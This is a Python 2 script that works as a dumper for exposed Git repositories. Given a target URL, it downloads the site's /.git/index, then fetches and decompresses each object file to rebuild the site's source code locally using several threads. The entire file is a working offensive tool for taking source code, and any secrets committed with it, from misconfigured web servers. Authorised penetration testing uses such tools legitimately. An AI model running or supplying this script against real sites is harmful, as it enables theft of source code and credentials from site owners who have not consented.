#!/usr/bin/env python
# coding:utf-8

import requests
import zlib
import sys
import os
import re
import threading
import Queue
import urlparse
import optparse
from lib.parser import parse
reload(sys)
sys.setdefaultencoding('utf-8')

header = {
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	'Accept-Encoding': 'gzip',
	'Cache-Control': 'max-age=0',
	'Connection': 'keep-alive',
	"Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3",
	"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
}


class GitBack(threading.Thread):
	def __init__(self, name, size, sha1):
		threading.Thread.__init__(self)
		self.name = name
		self.size = size
		self.sha1 = sha1
		self.lock = threading.Lock()

	def run(self):
		global url
		global domain
		try:
			target = requests.get(url + '/.git/objects/' + self.sha1[:2] + '/' + self.sha1[2:],
									headers=header, stream=True, allow_redirects=False, timeout=20)
			self.lock.acquire()
			print 'the size is {}M'.format(self.size/1000000)
			print 'the status_code {}'.format(target.status_code)
			self.lock.release()
			if target.status_code in [302, 404]:
				self.lock.acquire()
				print '[Error] File not found, redirecting {}'.format(self.name)
				self.lock.release()
				sys.exit(0)
			try:
				target = zlib.decompress(target.content)
				target = re.sub('blob \d+\00', '', target)
				target_dir = os.path.join(domain, os.path.dirname(self.name))
				if target_dir and not os.path.exists(target_dir):
					os.makedirs(target_dir)
				with open(os.path.join(domain, self.name), 'wb') as f:
					f.write(target)
					self.lock.acquire()
					print '[OK] {}'.format(self.name)
					self.lock.release()
			except zlib.error:
				self.lock.acquire()
				print '[Error] Fail to decompress, Maybe 301 redirecting {}'.format(self.name)
				self.lock.release()
			except Exception as e:
				raise e
		except requests.exceptions as e:
			raise e
if __name__ == '__main__':
	parser = optparse.OptionParser('Usage: %prog [option] target')
	parser.add_option('-t', '--threads', dest='threads_num',
				default=6, type='int', help='Number of threads. default=6')
	parser.add_option('-s', '--size', dest='max_size',
				default=5, type='int', help='max size of file. default is 5M')
	(options, args) = parser.parse_args()
	if len(args) < 1:
		parser.print_help()
		sys.exit(0)
	url = args[0]
	queue = Queue.Queue()
	domain = urlparse.urlparse(url).netloc.replace(':', '-')
	if not os.path.exists(domain):
		os.mkdir(domain)
	r = requests.get(url + '/.git/index', headers=header)
	with open(os.path.join(domain, 'git_index'), 'wb') as f:
		f.write(r.content)
	for entry in parse(os.path.join(domain, 'git_index')):
		if "sha1" in entry.keys() and entry['size']/1000000 < options.max_size:
			queue.put((entry['name'].strip(), entry['size'], entry['sha1'].strip()))
	for i in range(options.threads_num):
		while 1:
			try:
				name, size, sha1 = queue.get(timeout=0.2)
				gitback = GitBack(name, size, sha1)
				gitback.start()
			except Queue.Empty:
				sys.exit(0)
